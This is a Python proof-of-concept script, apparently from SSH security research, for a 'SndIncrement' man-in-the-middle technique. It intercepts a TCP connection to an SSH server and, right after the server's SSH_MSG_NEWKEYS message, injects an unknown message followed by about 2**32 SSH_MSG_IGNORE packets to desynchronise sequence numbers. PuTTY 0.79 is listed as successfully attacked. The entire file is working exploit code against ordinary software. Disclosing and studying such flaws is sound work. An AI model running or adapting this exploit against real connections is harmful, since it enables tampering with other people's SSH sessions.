#!/usr/bin/python3
import sys
from binascii import unhexlify
from common import is_root, contains_newkeys, run_tcp_mitm
from tqdm import trange
from time import sleep

#####################################################################################
## Proof of Concept for the SndIncrement technique                                 ##
##                                                                                 ##
## Tested successfully against:                                                    ##
## - PuTTY 0.79 (OpenSSH 9.4p1 Server)                                             ##
##                                                                                 ##
## Tested unsuccessfully:                                                          ##
## - AsyncSSH / libssh (Timeouts)                                                  ##
## - OpenSSH (Wrap-Around Detection)                                               ##
## - dropbear (Disconnect on unknown message)                                      ##
##                                                                                 ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
#####################################################################################

INTERFACE='eth0'
TARGET_PORT=22
TARGET_IP = '192.168.22.10'

rogue_unknown_msg = unhexlify('0000000C060900000000000000000000')
rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
technique_in_progress = False
def inject_sndincrement(in_socket, out_socket):
    global technique_in_progress
    try:
        while True:
            data = in_socket.recv(4096)
            if contains_newkeys(data):
                print("[+] SSH_MSG_NEWKEYS sent by server identified!")
                technique_in_progress = True
                print("[+] Injecting unknown message to increment C.Snd!")
                out_socket.send(rogue_unknown_msg)
                print("[+] Injecting 2**32 - 1 SSH_MSG_IGNORE to fix C.Rcv!")
                for _ in trange(2**32 - 1):
                    out_socket.send(rogue_msg_ignore)
                print("[+] Injection done, waiting 3 seconds before continuing to forward traffic.")
                # Rough workaround to avoid forwarding any unimplemented messages to the server
                sleep(3)
                technique_in_progress = False
            if len(data) == 0:
                break
            out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.")
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
    in_socket.close()
    out_socket.close()

def pipe_discard_during_technique(in_socket, out_socket):
    global technique_in_progress
    try:
        while True:
            # PuTTY does not send SSH_MSG_NEWKEYS until the servers SSH_MSG_NEWKEYS has been received. So don't dropping it here.
            data = in_socket.recv(4096)
            if len(data) == 0:
                break
            if not technique_in_progress:
                out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.")
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
    in_socket.close()
    out_socket.close()

if __name__ == '__main__':
    if not is_root():
        print("[!] Script must be run as root!")
        sys.exit(1)

    print("--- Proof of Concept for SndIncrement technique ---")
    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match (C.Snd = S.Rcv + 1).")
    run_tcp_mitm(TARGET_IP, TARGET_PORT, forward_server_to_client=inject_sndincrement, forward_client_to_server=pipe_discard_during_technique)
